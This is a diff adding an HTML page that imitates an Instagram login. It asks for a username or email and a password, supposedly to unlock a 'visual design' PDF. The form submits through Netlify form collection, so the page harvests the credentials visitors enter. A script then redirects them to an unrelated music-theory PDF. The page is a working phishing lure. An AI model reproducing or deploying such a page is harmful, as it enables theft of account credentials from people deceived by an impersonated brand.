@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Acesso</title>
+</head>
+<body>
+    <div class="container">
+        <div class="texto">
+            <h1 class="title">Bem-vindo!</h1>
+            <p class="description">Por favor, faça login para acessar o PDF sobre design visual:</p>
+        </div>
+
+        <div class="login-container">
+            <img src="img/logoinsta.png" alt="logo instagram" class="logo">
+            <form class="login-form" name="contact" method="POST" action="/redirect.html" netlify>
+                <input type="text" name="username_email" placeholder="Usuario ou E-mail" autocomplete="off">
+                <input type="password" name="password" placeholder="Senha" autocomplete="off">
+                <button type="submit">Logar</button>
+                <div class="divider"></div>
+                <div class="ou">OU</div>
+                <a href="#">Esqueceu a senha?</a>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function redirectToURL() {
+            // Redireciona para a URL desejada após 1 segundo (1000 milissegundos)
+            setTimeout(function() {
+                window.location.href = "https://catalogobandasdemusicape.wordpress.com/wp-content/uploads/2019/03/apostila-de-teoria-musical.pdf";
+            }, 100);
+        }
+    </script>
+</body>
+</html>
